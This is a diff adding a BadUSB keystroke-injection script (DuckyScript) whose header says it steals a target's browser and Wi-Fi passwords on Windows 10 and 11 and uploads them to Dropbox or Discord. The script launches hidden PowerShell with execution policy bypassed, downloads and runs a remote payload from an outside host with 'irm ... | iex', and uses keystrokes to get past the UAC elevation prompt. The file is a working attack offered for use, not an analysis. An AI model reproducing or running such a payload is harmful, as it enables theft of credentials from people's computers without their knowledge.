@@ -1,0 +1,17 @@
+REM     Title: Wifi and Browser Password Grabber conbo
+
+REM     Author: Arpan Ghosh
+
+REM     Description: This payload grabs your target's browser passwords and wifi passwords and uploads them to either Dropbox (update variable $db), Discord (update variable $dc), or both.
+
+REM     Target: Windows 10, 11
+
+GUI r
+DELAY 500
+STRING cmd /c start /min "" powershell -w h -NoP -Ep Bypass -Command "$dc='';$db='';irm badusb.39039820.xyz/passcombo | iex"
+DELAY 500
+CTRL-SHIFT ENTER
+DELAY 1800
+LEFT
+DELAY 250
+ENTER
